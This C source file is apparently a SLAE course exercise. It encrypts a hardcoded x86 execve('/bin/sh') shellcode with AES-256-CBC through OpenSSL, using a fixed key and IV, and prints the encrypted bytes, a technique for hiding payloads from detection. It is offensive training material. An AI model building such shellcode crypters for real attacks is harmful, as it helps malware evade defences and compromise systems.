#include <stdio.h>
#include <string.h>

/*
 * File Encryptor.c
 * Author: Saleh Bin Muhaysin
 * SLEA: SLAE-1101
 * Date: 25/12/2017
 */
 
// openSSL libraries (install libssl-dev before)
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>

// shellcode to encrypt
unsigned char code[] = \
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
;

unsigned char key[] = "0123456789abcdef0123456789abcdef"; // A 256 bit key = 32 hex
unsigned char iv[] = "0123456789abcdef"; 		  // A 128 bit IV = 16 hex


// function get the shellcode to print and print it
void print_code_byte(unsigned char shellcode[]){
	for(int i = 0 ; i  < strlen(shellcode)  ; i++){
		printf("\\x%02x" , shellcode[i]);
	}
	printf("\n");
}

// function used to print any openssl errors during encryption
void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}


// function get the shellcode, key, iv, and encrypted shell code address where the encrypted shellcode will be stored
int encrypt(unsigned char shellcode[], int shellcode_len, unsigned char *key,
  unsigned char *iv, unsigned char *encrypted_shell) {
  
	EVP_CIPHER_CTX *ctx;// contain the context struct
	int len, encrypted_len;
	// Create and initialise the context 
	if(!(ctx = EVP_CIPHER_CTX_new())) 
		handleErrors();
	// Initialise the encryption operation.
	if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
		handleErrors();
	// Provide the shellcode to be encrypted
	if(1 != EVP_EncryptUpdate(ctx, encrypted_shell, &len, shellcode, shellcode_len))
		  handleErrors();
	encrypted_len = len;
	// Finalise the encryption.
	if(1 != EVP_EncryptFinal_ex(ctx, encrypted_shell + len, &len)) 
		handleErrors();
	encrypted_len += len;
	// Clean up
	EVP_CIPHER_CTX_free(ctx);
	return encrypted_len;
}



int main(int argc, char *argv[] ){
	
	
	int shellcode_len = strlen(code);
	
	printf("[+] shellcode Length: %d\n" , shellcode_len);
	print_code_byte(code);
	
	// print the KEY and IV
	printf("[+] AES 256-bit KEY: %s\n" , key);
	printf("[+] AES 128-bit IV: %s\n" , iv);
	
	

	// buffer for encrypted shellcode
	unsigned char encrypted_shell[ 128 ];
	int encrypted_len;
	
	//initialize the library
	ERR_load_crypto_strings();
	OpenSSL_add_all_algorithms();
	OPENSSL_config(NULL);
	
	// encrypt the shellcode
	encrypted_len = encrypt(code, shellcode_len , key , iv , encrypted_shell );
	
	// null the last byte of the encrypted shellcode
	encrypted_shell[encrypted_len] = '\0';
	
	// print the encrypted shellcode
	printf("[+] Encrypted shellcode %d:\n" , encrypted_len);
	print_code_byte(encrypted_shell);
	//clean up
	EVP_cleanup();
	ERR_free_strings();
	
	return 0;
}

